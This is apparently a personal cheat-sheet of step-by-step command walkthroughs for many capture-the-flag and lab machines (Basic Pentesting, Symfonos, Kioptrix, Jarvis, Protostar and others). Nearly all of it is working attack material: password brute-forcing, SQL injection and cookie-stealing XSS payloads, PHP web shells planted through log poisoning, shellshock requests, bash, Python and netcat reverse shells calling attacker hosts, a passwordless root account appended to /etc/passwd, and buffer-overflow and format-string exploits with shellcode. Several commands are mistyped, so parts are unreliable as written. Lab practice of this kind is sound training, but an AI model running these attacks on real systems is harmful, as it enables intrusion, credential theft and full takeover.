BOX STEP




Basic Pentesting 2
==================================
dirb http://10.0.2.14
enum4linux 10.0.2.14
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.0.2.14 ssh
ssh jan@10.0.2.14
https://www.exploit-db.com/download/44298.c
cat /home/kay/.ssh/id_rsa
ssh2john key > sshtojohn
john sshtojohn
ssh -i -d_rsa@localhost
cat pass.bak
sudo -i
//another way
find / -perm -u=s -type f 2>/dev/null
cd home/kay/
vim.basic pass.bak




Web For Pentester I & II
==================================
//SQL Inject
root' or '1'='1
root'%09or%09'1'='1
root'/**/or/**/'1'='1
2'/**/or/**/'1'='1
2 or 1=1
' or 1=1#
‘ or 1=1 LIMIT 1#
example5/?limit=3 union all select * from users
username =’\ ‘ and password =’ or 1=1#
/example5/?group=username union all select * from users
example7/?id=1 --dump-all)
呵' or 1=1 #
//XXS
<script>document.write('<img src="http://10.0.2.15/?'+document.cookie+'  "/>');</script>
#socat TCP-LISTEN:80,reuseaddr,fork -
>document.cookie = "PHPSESSID=07st4kqcbdr2ddrd4naalt9504"
<script>alert(1);</script>
<script>alert(1);</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="xxxx" onerror="alert(1)">
<script>prompt(1)</script>
";alert(1);//
';alert(1);//
/" onmouseover="alert(1)
#<script>alert(1)</script>



Pumpkin Garden
==================================
nmap -p- -A 10.0.2.15
ftp 10.0.2.15
get note.txt
cat note.txt
dirb http://10.0.2.15:1515
10.0.2.15;1515/img/hidden_secret/clue.txt
echo c2NhcmVjcm93IDogNVFuQCR5 | base64 -d
ssh scarecrow@10.0.2.15 -p 3535
su goblin
//exploit https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit
sudo ./sudoedit $1



Necromancer 1
==================================
nmap -sU -p1-65535 10.0.2.16
nc -lvp 4444
echo "$from port 4444" | base64 -d
nc -u 10.0.2.16
opensesame //md5 hash reverse flag3
nikto -h 10.0.2.16
wget http://10.0.2.16/pileoffeathers.jpg
strings pileoffeathers.jpg
zip pileoffeathers.jpg && unzip pileoffeathers
cat feathers.txt
10.0.2.5/amagicbridgeappearsatthechasm
cewl https://en.wikipedia.org/wiki/List_of_occult_terms -m4 -d0 -w listofwords.txt
wget http://10.0.2.16/amagicbridgeappearsatthechasm/talisman
chmod 700 talishman && ./talishman
wearTalisman
chantToBreakSpell
echo “blackmagic” | nc -u 10.0.2.16 31337
http://10.0.2.16/thenecromancerwillabsorbyoursoul/
aircrack-ng /root/Downloads/necromancer.cap -w /usr/share/wordlists/rockyou.txt
use auxiliary/scanner/snmp/snmp_enum
set rhost 10.0.2.16
set community death2all
run
snmpwalk -v 2c -c death2all 10.0.2.16
Unlocked
hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.16:22
ssh demonslayer@10.0.2.16
nc -u localhost 777
KELEWAN
Mephistopheles
Hedge
sudo cat /root/flag11.txt



Replay 1 CTF
==================================
10.0.2.17/robots.txt
wget 10.0.2.17/bob_bd.zip
unzip bob_bd.zip
string client.bin
//found 2nd passwd, 1st passwd inside html homepage
./client.bin //apps to connect database, use it to make machine connect me
vi client.bin
nc -e /bin/bash 192.168.1.25 4444;ls;ls;ls;ls;ls;ls;ls; //binnary file read binary reverse
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
cd Documents/.ftp
cat user.passwd
sudo -i



Raven 1
==================================
nikto --host http://10.0.2.18
wpscan --url http://10.0.2.18/wordpress --wp-content-dir -ep -et -eu
wpscan --url http://10.0.2.18/wordpress -U steven -w /usr/share/wordlists/rockyou.txt

//login ssh user michael no passwd
ssh michael@10.0.2.18
cat /var/www/html/wordpress/wp-config.php
john wp_hashes.txt
john show wp-hashes.txt
su steven
sudo -l
sudo python -c 'import pty;pty.spawn(â€œ/bin/bashâ€);â€™
sudo python -c 'import os;os.system("/bin/bash")'
 



DerpNStink
==================================
dirb http://10.0.2.19 /usr/share/wordlist/dirb/big.txt
wpscan --url http://10.0.2.19/weblog
//login admin admin & upload php reverse shell to galery /usr/share/webshells/php/php-reverse-shell.php
nc -lvp 3434
cat /var/www/html/weblog/wp-config.php
//wp-config.php get credentials databases
//login ftp, get rsa key, login ssh
ssh key stinky@10.0.2.19
//download pcap exe with wireshark and get the password
su mrderp
sudo -l
mkdir -p /home/mrderp/binaries/
echo "/bin/bash" > derpy.sh && chmod +x derpy.sh


Casino Royale
==================================
dirb http://10.0.2.20
searchsploit poker
searchsploit -m 6676
sqlmap -u http://10.0.2.20/pokeradmin/index.php --forms --risk 3 --level 5 --dbs --batch
sqlmap -u http://10.0.2.20/pokeradmin/index.php --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
searchsploit snowfox
telnet 10.0.2.20 25
mail from: asd
rcpt to: valenka
data
subject: obanno
http://10.0.2.16/form.html
.
quit
//php web shell by login ftp
ftp://10.0.2.20
nc -lvp 3434
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
//root apps running under user apps & edit user apps with python reverse run by root
export RHOST="10.0.2.16";export RPORT=2323;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 2323



DC -1
==================================
nmap -sV -sC 10.0.2.21
whatweb http://10.0.2.21
searchsploit Drupal 7
python /usr/share/exploitdb/exploits/php/webapps/34992.py -u asdasdasd -p asdasdasd -t http://10.0.2.21
//login, insert plugin from https://www.drupal.org/project/shell
nc -nv 10.0.2.16 3434 -e /bin/bash
nc -lvp 3434
msfconsole
use exploit/multi/http/drupal_drupageddon
set lhost 10.0.2.21
run exploit
find / -perm -4000 -type f 2>/dev/null | xaxrgs ls -laht
find . -exec '/bin/sh' \;
find / -name flag*
cat /var/www/sites/default/settings.php


Prime-1
====================================
dirb http://10.0.2.20
dirb http://10.0.2.20 -X .txt,.php,.html
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 500 --hl 6 http://10.0.2.20/image.php?secrettier360=FUZZ
msfveom -p php/meterpreter/reverse_tcp lhost=10.0.2.16 lport=3434 R
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 10.0.2.20
set lport 3434
exploit
/1
use exploit/linux/local/bpf_sign_extention_priv_esc
set session 1
exploit
/2
cd /tmp
nano exp.c //grep this content https://packetstormsecurity.com/files/148517/Linux-Kernel-Local-Privilege-Escalation.html
gcc exp.c exp
./exp



HA Wordy
====================================
dirb http://10.0.2.19
wpscan --url http://10.0.2.19/wordpress --enumerate u
//Reflex galery || Arbitary File Upload
use exploit/unix/webapp/wp_refrexgallery_file_upload
set rhost 10.0.2.19
set targeturi /wordpress/
exploit
find / -perm -u=s -type f 2>/dev/null //cp & wget
cp /etc/passwd /var/www/html/ //edit on local
openssl passwd -1 -salt ignite pass123
wget http://10.0.2.16/passwd
//Mail Masta & WP Support || LFI
http://10.0.2.19/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
curl http://10.0.2.19/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd
echo "YWFydGk6YWFydGlAZ21haWwuY29t" | base64 -d	
searchsploit wp-support
searchsploit -m 41006
cat 41006.txt
//create html file
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
Username: <input type="text" name="username" value="aarti">
<input type="hidden" name="email" value="aarti@gmail.com">
<input type="hidden" name="action" value="loginGuestFacebook">
<input type="submit" value="Login">
</form>
//Gwolle || RFI
http://10.0.2.19/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.0.2.16/shell.php
nc -lvp 3434



Symfonos: 1
====================================
enum4linux 10.0.2.22
smb://10.0.2.22/anonymous
smb://10.0.2.22/helios
smbclient //10.0.2.22/helios
wpscan --url http://symfonos.local/h3l105/ --enumerate u
//Site Editor Exploit
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
//SMTP Poisoning
telnet 10.0.2.20 25
helo example.com
mail from: asd@asd.asd
rcpt to: asd@symfonos.localdomain
data
<?php echo shell_exec($_GET['cmd']); ?>
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/asd&cmd=id
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/asd&cmd=nc%20-e%20%2Fbin%2Fbash%2010.0.2.16%203434
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
find / -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -laht
strings /opt/statuscheck
//build program set user id in C setuid.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{setuid(0); setgid(0); system("/bin/bash");}
gcc -o setuid setuid.c
echo "chown root:root /tmp/setuid && chmod u+s /tmp/setuid" >> ./curl
chmod 777 curl && chmod 777 setuid
explort $PATH=/tmp:$PATH
/opt/statuscheck



Symfonos: 2
==================================
nmap -sC -sV 10.0.2.23
smbmap -H 10.0.2.23
smbclient -N \\\\10.0.2.23\\anonymous
cd backups
get log.txt
hydra -l aeolus -P /home/rockyou.txt ftp://10.0.2.23
ssh aeolus@10.0.2.23
cd /tmp
wget http://10.0.2.16/linuxenum.sh
./linuxenum.sh
/etc/apache2/sites-enabled
searchsploit librenms
ssh -L 8888:localhost:8080 aeolus@10.0.2.23
msfconsole
use exploit/linux/http/librenms_addhost_cmd_inject
set rhosts localhost
set rport 8888
set username aeolus
set password sergioteamo
set lhost eth0
exploit
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
sudo /usr/bin/mysql -e '\! /bin/sh'



Symfonos 3
===================================
dirb http://10.0.2.24
dirbuster http://10.0.2.24/gate/
10.0.2.24/cgi-bin/underworld/
//with metasploit 
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_enc_exec
set rhost 10.0.2.24
set lhost 10.0.2.16
set targeturi /cgi-bin/underworld/
exploit
//shellshock with manual curl (manual 'iptime' command linux)
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.0.2.24/cgi-bin/underworld
curl -H "user-agent: () { :; }; echo; echo; /bin/nc -e /bin/bash 10.0.2.16 3434" http://10.0.2.24/cgi-bin/underworld
curl -A "() { :; }; /bin/bash -c 'nc 10.0.2.16 3434 -e /bin/sh'" http://10.0.2.24/cgi-bin/underworld
nc -lvp 3434
python -c "import pty;pty.spawn('/bin/bash')"
//tools pspy monitor all process (include cron) real-time
wget http://192.168.127.129/pspy32
chmod 755 pspy32
./pspy32
tcpdump -v -i lo port 21
vi ftpclient.py
//edit cron job file ftpclient.py
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.16",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
//or add this script under the line
import sys
import os
os.system(nc 10.0.2.16 9090 -e /bin/bash)
nc -lvp 9090



Symfonos 4
===================================
dirb http://10.0.2.27/ /usr/share/wordlists/dirb/big.txt -X .php
// login sqli with 'or'1'='1'#
http://10.0.2.27/sea.php?file=../../../../../../../var/log/auth
ssh '<?php system($_GET['c']); ?>'@10.0.2.27
ssh 10.0.2.27 -l '<?php die(exec($_GET["c"]));?>'
http://10.0.2.27/sea.php?file=../../../../../../../var/log/auth&c=nc 10.0.2.16 3434 -e /bin/bash
nc -lvp 3434
ss -tulpn
ps
socat tcp-listen:7000,reuseaddr,fork tcp:localhost:8080
http://10.0.2.27:7000
//intercept cookie
//change with this reverse python script with base64 ecnryption
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 10.0.2.16 4444"], null, null, null]}
root:pass123


Solid State
===================================
nmap -sC -sV -p- 10.0.2.28
telnet 10.0.2.28 4555
help
listuser
setpassword james asd
setpassword john asd
setpassword mindy asd
telnet 10.0.2.28 110
user john
pass asd
list
retr 1
quit
telnet 10.0.2.28 110
user mindy
pass asd
list
retr 1
retr 2
quit
ssh mindy@10.0.2.28
exploitdb35513.py //https://www.exploit-db.com/exploits/35513/
payload = 'nc -e /bin/sh 10.0.2.16 8000'
./exploitdb35513
nc -lvp 8000
ssh mindy@10.0.2.28
python -c 'import pty;pty.spawn("/bin/bash")'
ps -aux | grep james
cd /opt
ls || cat tmp.py
nano tmp.py
#!/usr/bin/env python
import os
import sys
os.system('/bib/nc -e /bin/bash 10.0.2.16 3434')
cd /tmp
wget http://10.0.2.16/tmp.py
nc -lvp 3434
cp tmp.py /opt




Node 1
===============================
nmap -sC -sV -p- 10.0.2.29
view-source:http://10.0.2.29:3000/login
view-source:http://10.0.2.29:3000/assets/js/app/controller/home.js
10.0.2.29:3000/api/users/latest
10.0.2.29:3000/api/users
//hash crack with crackstation.net
cat myplace.backup | base64 -d > myplace
file myplace.backup
unzip myplace
fcrackzip –dictionary –use-unzip –init-password /usr/home/rockyou.txt myplace
cat app.js
ssh mark@10.0.2.29
uname -a
cat /etc/issue
wget https://www.exploit-db.com/download/44298 /tmp/44298.c
gcc 44298.c -o 44298
./44298
//use mongodb exploit
cd /home/node/
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.16 LPORT=1234 -f elf -o rev
cp rev /var/www/html
wget http://10.0.2.16/rev
mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler
>db.tasks.insert({"_id" : 0, "cmd" : "/tmp/rev"})
>quit()
nc -lvp 1234
gzip -c < /usr/local/bin/backup > /tmp/backup.gz
base64 < /tmp/backup.gz




Kioptrix 1
===================================
nmap -sC -sV -V -p- 10.0.2.30
enum4linux 10.0.2.30
cp /usr/share/exploitdb/exploits/unix/remote/764.c
gcc -o fuck 764.c -lcrypto
./fuck 0x6b 10.0.2.30 -c 45
cp /usr/share/exploitdb/exploits/multiple/remote/10.c .
gcc -o exploitsamba 10.c
./exploitsamba -b 0 -c 10.0.2.16 10.0.2.30



OZ 1
===================================
//mysql seems not running
git clone https://github.com/epinna/tplmap
./tplmap.py -u 'http://192.168.204.132:8080' -X POST -d 'name=*&desc=anything' -c 'token=TOKEN' --reverse-shell 192.168.204.129 3434
nc -lvp 3434



MR Robot
===================================
nmap -sC -sV -A -p- 10.0.2.31 -oA nmapfull
dirb http://10.0.2.31
wpscan --url http://10.0.2.31 --enumerate u
http://10.0.2.31/robots.txt
cat fsocity.dic | sort -r | uniq > fsocity.dic.sort
wc -l fsocity.dic.sort
wpscan --url http://10.0.2.31 -U elliot -P /home/mrrobot/fsocity.dic.sort
cp /usr/share/webshell/php/php-reverse-shell.php
//edit and upload shell into archive wordpress
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset //full stty source:https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
10.0.2.31/wp-content/themes/twentyfifteen/archive.php
//crack password.raw-md5 from /home/robot in md5crack online
echo ljBOUvoyFpIgpUgfJFOyFoVouF > robothash
hashcat -a 0 -m 0 robothash /home/rockyou.txt 
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
/usr/local/bin/nmap --interactive
!sh



Pwn Lab INIT
===================================
dirb http://10.0.2.32
10.0.2.32/?page=php://filter/convert.base64-encode/resource=config
//encode base64 passwd mysql
mysql -h 10.0.2.32 -u root -p
//dump database Users
login
10.0.2.32/?page=upload
//get source from response in burp
//read rfi to exe source: https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
10.0.2.32/?page=php://filter/convert.base64-encode/resource=index
document.cookie = "lang=../../../../../etc/passwd"
document.cookie = "lang=../upload/mif813yr9hosaf8h0iqj0.gif"
nc -lvp 3434"
10.0.2.32
su kane
cd && ls -lah
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
strings msgmike
echo /bin/bash > /tmp/cat
chmod 777 /tmp/cat
echo $PATH
export PATH=/tmp:$PATH
./msgmike
cd && ls -lah
find / -perm -4000 -type f 2>/dev/null | xargs | ls -laht
./msg2root
asdasd && /bin/sh
asdasd; bash -p
document.cookie= 'lang=../../../../../etc/passwd; expires=Thu; 01 Jan 1970 00:00:00 GMT; path=/; domain=10.0.2.32"
document.cookie= 'lang=../upload/mif813yr9hosaf8h0iqj0.gif; expires=Thu; 01 Jan 1970 00:00:00 GMT; path=/; domain=10.0.2.32"



Wintermute 1
==========================================
kali(10.0.2.16) - (.33) straylight (192.168.56.102) - (.103) Neuromancer
http://10.0.2.33:3000
http://10.0.2.33:3000/lua/flow_stats.lua
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail
telnet 10.0.2.33 25
helo asd.asd
mail from: asd@asd.asd
//or mail from: <?php echo shell_exec($_GET['cmd']);?>
//or rcpt to: <?php system($_POST['cmd']);?>
rcpt to: <?php system($_REQUEST['cmd']);?>
data
.
quit
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail&cmd=id
nc -lvp 3434
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail&cmd=nc%20-e%20%2Fbin%2Fbash%2010.0.2.16%203434
python -c 'import pty;pty.spawn("/bin/bash")'
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit screen 4.5
cp /usr/share/exploitdb/exploits/linux/local/41154.sh .
//cant complie, create manual making file libhax.c and rootshell.c
wget http://10.0.2.16/libhax.c
wget http://10.0.2.16/rootshell.c
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
cd /etc
unmask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
./tmp/rootshell
wget http://10.0.2.16/ping.sh
cat ping.sh
#!/bin/bash
for ip in $(seq 1 254); do
	ping -c 1 192.168.56.$ip | grep "bytes from" | cut -d " " -f4 |cut -d ":" -f1 &
done
nc -vnzw1 192.168.56.103 1-65535
which socat
socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.56.103:8009 &
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.56.103:8080 &
socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.56.103:34483 &
socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.0.2.16:4444 &
10.0.2.33:8080/struts2_2.3.15.1-showcase
searchsploit struts showcase
//exploit struts as exploit.sh from https://www.exploit-db.com/exploits/42324/
nc -lvp 4444
./exploit.sh "nc 192.168.56.102 4444"
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf -o rev
cp rev /var/www/html
python -m SimpleHTTPServer 4444
./exploit.sh "wget http://192.168.56.102/rev -O /tmp/rev"
./exploit.sh "chmod 755 /tmp/rev"
./exploit.sh "sh -c /tmp/rev"
nc -lvp 4444
ssh keygen -t ta
cat id_ta.pub
//copy id_ta from kali to authorized keys target
cd /home/ta
chmod 700 .ssh
touch .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
echo "cat id_ta.pub" > .ssh/authorized_keys
ssh -i id_ta -p 34483 ta@10.0.2.33
uname -a
searchsploit ubuntu 16.04
wget http://192.168.56.102/exploit //source exploit https://www.exploit-db.com/exploits/44298/
chmod +x exploit
./exploit



Kioptrix 2
=================================================
http://10.0.2.15
//SQLi user:'or'a'='a'#
sqlmap -u "http://10.0.2.15/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
cat php-reverse-shell.php | nc -l 8080
; wget 10.0.2.16:8080 -O /tmp/shell.php
; php /tmp/shell.php
; bash -i >& /dev/tcp/10.0.2.16/3434 0>&1
nc -lvp 3434
;/usr/local/bin/nc 10.0.2.16 4444 -e ‘/bin/bash'
nc -lvp 4444
searchsploit centos 4.5
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c /var/www/html/
python -m SimpleHTTPServer 8888
wget http://10.0.2.16/9542.c -O /tmp/ex.c
gcc ex.c
./ex.out
cat /var/www/html/index.php //to find mysql cred




Jarvis
================================================
http://10.10.10.143/room.php?cod=3'
sqlmap -u http://10.10.10.143/room.php?cod=3 --dump
sqlmap -u http://10.10.10.143/room.php?cod=3 --level 5 --risk 3 --dump
sqlmap -u http://10.10.10.143/room.php?cod=3 --level 5 --risk 3 --os-shell
python -m SimpleHTTPServer 8888
wget http://10.10.14.86:8888/p0wny.php //source https://github.com/flozz/p0wny-shell/blob/master/shell.php
http://10.10.10.143/shell.php
socat file:`tty`,raw,echo=0 tcp-listen:3434 //listener
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.86:3434 //target
netstat -plnt
sudo -l
python /var/www/AdminUtilities/simpler.py
python simpler.py -p
cat simpler.py
cat shell.sh
#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.86/4343; sh <&196 >&196 2>&196
//input $(/bin/bash /tmp/shell.sh)
nc -lvp 4343
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
//exploit systemctl source:https://gtfobins.github.io/gtfobins/systemctl/
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/output
echo '#/bin/bash
nc 10.10.14.86 9999 -e /bin/bash' > hacked
nc -lvp 4444  //listening
echo '[Unit]
Descriptor= hacked Service
ExecStart=/bin/sh -c /tmp/hacked
[Install]
WantedBy=multi-user.target' > hacked.service
/bin/systemctl enable --now hacked.service
stop hacked.service
start hacked.service
/bin/bash -i  //got root shell



Haystack
======================================
wget http://10.10.10.115/needle.jpg
strings needle.jpg
echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
http://10.10.10.115:9200/_cat/indices
http://10.10.10.115:9200/_search?q=clave
echo dXNlcjogc2VjdXJpdHkg | base64 -d
echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
ssh security@10.10.10.115
shell.js //LFI kibana 6.4 souce:https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
ss -lnt
ssh -L 9000:localhost:5601 security@10.10.10.115
ssh -R 9000:localhost:5601 root@10.10.14.43 //another tunnel
shell.js //reverse shell in js
curl -O 10.10.14.43:3434/shell.js
nc -lvp 3434
http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../tmp/shell
http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../dev/shm/shell.js
whereis logstash
cat output.conf
echo “Ejecutar comando : bash -i >& /dev/tcp/10.10.16.161/6666 0>&1” > /opt/kibana/logstash_test
echo “Ejecutar comando : /tmp/nc -e /bin/bash 10.10.14.31 2222” > /opt/kibana/logstash_test
cat /dev/shm/root.sh             
#!/bin/bash
echo 'rooot::0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'Ejecutar comando : sh /dev/shm/root.sh' > /opt/kibana/logstash_pwned
su rooot



Natas
============================================
hexeditor jpg.jpg
FF D8 FF E0
echo exec()
echo system()
passthru()
diff file1 file2


Pinkys Palace V1
===========================================
export {http,https,ftp}_proxy=10.0.2.35:31337
//change double proxy Burp Project Options -> upstream proxy server
//dst=*, proxyhost=10.0.2.35, proxy port=31337
gdb ./adminhelper
(gdb) info funtions
msf-pattern_create -l 200
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Aa0Ab1Ab2Ab3
//copy value in "saved rip ="
msf-pattern_offset -q 0x63413563
python -c "A"*72+"BBBBBB"
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
(gdb) disassemble spawn
(gdb) r $(python -c "print 'A'*72+'\xd0\x47\x55\x55\x55\x55'")
python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\x47\x55\x55\x55\x55'" > output
./adminhelper `cat output`
python -c 'print "A"*268+"BBBB"+"CCCCCCCCCCCCC"'



TMUX
==================================
prefix=ctrl+a
ctrl + r = recursive search
prefix + c = new windows
tmux attach-session -t name
prefix + { = find
	+ ? = search words
	ctrl + space = block
	alt + w = copy to buffer
prefix + [ = edit mode
prefix + ] = paste buffer
prefix + % = half screen beside
prefix + " = half screen under
prefix + z = zoom screen in and out
prefix + } or <space> = change looks
prefix + s or ls = display session
prefix + x = kill unresponsif window




Protostart Format
============================================
./format0 $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")
objdump -t format1 | grep target
for i in {1..200};do echo "trying offset $i - `./format1 DDDD%$i\\$08x`"; done | grep DDDD44444444
./format1 $(python -c "print 'AAAA'+'%x.'+'%x'")
./format1 $(python -c "print 'AAAA'+'%x.'*128+'%x'")					//got 414141 value
./format1 $(python -c "print '\x38\x96\x04\x08' + '%x.'*128 + '%n'")	//replacc]e A
python -c "print 'AAAA'+'%x.'*3+'%x'" | ./format2
for i in {1..200};do echo DDDD%$i\$08x > /tmp/temp; echo "trying offset $i - `./format2 < temp`"; done | grep DDDD44444444
python -c "print '\xe4\x96\x04\x08'+'%4\$n'" | ./format2
python -c "print '\xe4\x96\x04\x08'+'A'*60+'%4\$n'" | ./format2
//target format3 == 0x01025544
(echo -e $(python -c 'print "%08x"')) | ./format3
(echo -e $(python -c 'print "AAAA"+"%08x."*100')) | ./format3
(echo -e $(python -c 'print "AAAA"+"%12$08x."')) | ./format3
let x=0x01025544; echo $x;
(echo -e $(python -c 'print "\xf4\x96\x04\x08"+"%16930112u"+"%12$08n"')) | ./format3
echo -e (python -c "print '\x24\x97\x04\x08JUNK\x25\x97\x04\x08JUNK\x26\x97\x04\x08JUNK\x27\x97\x04\x08'+'%x%x%141x%n%208x%n%128x%n%260x%n'") | ./format4




Protostar Stack 5
============================================
gdb -q stack5
set dissasebly-flavor intel
disas main
(gdb) b* 0x080483da (ret value)
(gdb) r
ABCDEF
(gdb) i r
(gdb) x/s $esp				//(eax value/first value) should be ABCDEF
(gdb) p/d 0xbffff77c - 0xbffff730	//$esp - $eax will be offset value
msf-pattern_create -l 100
msf-pattern_offset -q 0x63413563	//offset value msf
(gdb)r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
(gdb)x/s 0xbffff77c					//should be "BBBB"
python -c 'print "A"*76+"B"*4+"C"*100'
(gdb) r								//input python ABC
(gdb)x/60s $eax						//return address must be 0xbffff77c+4
									//got 0xbffff780 (0xbffff77c+4) (CCCC... value)
//the exploit spawn shell
import struct
 
def m32(dir):
    return struct.pack("I",dir)
 
padding="A"*76
ret=m32(0xbffff780)
nops="\x90"*20
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"
 
print padding+ret+nops+shellcode									
								
msfvenom -p linux/x86/exec CMD=/bin/sh -f py	//create shellcode w msfvenom
(python /tmp/exp ;cat) | ./stack5
//padding+ret_dir+nops+shellcode



Protostar Stack 6
============================================
//exploit function gets() and no binary Execution
strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
(gdb) set disassembly-flavor intel
(gdb) r
ctrl+c
(gdb) info proc map				//print address location environtment
(gdb) x/s 0xb7e5700 + 0x11f3bf	//address "/bin/sh" (stack6 in libc + string /bin/sh from libc
(gdb) p system					//address system
(gdb) p exit					//address exit
//exploit ret2libc = padding+system addr +(return/exit/4hexdump)+shell addr
import struct
padding="A"*80
system= struct.pack("I", 0xb7ecff80)
return= "AAAA"
shell=struct.pack("I", 0xb7fb63bf)
print padding+system+return+shell




Protostar Stack 7
============================================
//exploit return strdup(buffer)
objdump -M intel -d stack7 | grep “call.*eax”
Payload = shellcode + (NOP-(len(shellcode))+eax_addr
echo `python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*25 + "\xbf\x84\x04\x08")'` | /opt/protostar/bin/stack7


Buffer overflow
============================================
(gdb) disas main
(gdb) break main
objdump -d apps
(gdb) set disassembly-flavor intel
-perm -4000 | grep apps
(gdb) p system
(gdb) p exit
eax = return exec
strcpy() instead of strncpy()
//EIP = instruction pointer
//ESP = stack pointer (point to lower memory/top of the stack
//EBP = base pointer (point to higher memory/bottom of the stack)
$ESP - 300(nopsled)
gcc code1.c -o code1 -save-temps
printenv
ret - $rsp
functions:
gets() //input after execution
scanf() //input after eecution
strcpy() //input argument
sprintf()
strcat()
memcpy()




Silky-CTF
================================================
crunch 7 7 charset.lst mixalpha-numeric-all-space -o asd -t s1lKy@@
cat asd | sort -r > dsa
hydra -l silky -P dsa 10.0.2.37 -t 4 -V ssh
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
scp silky@10.0.2.37:/usr/bin/sky .
string /usr/bin/sky
nano /tmp/whoami
#!/bin/bash
echo 'rooot::0:0:root:/root:/bin/bash' >> /etc/passwd
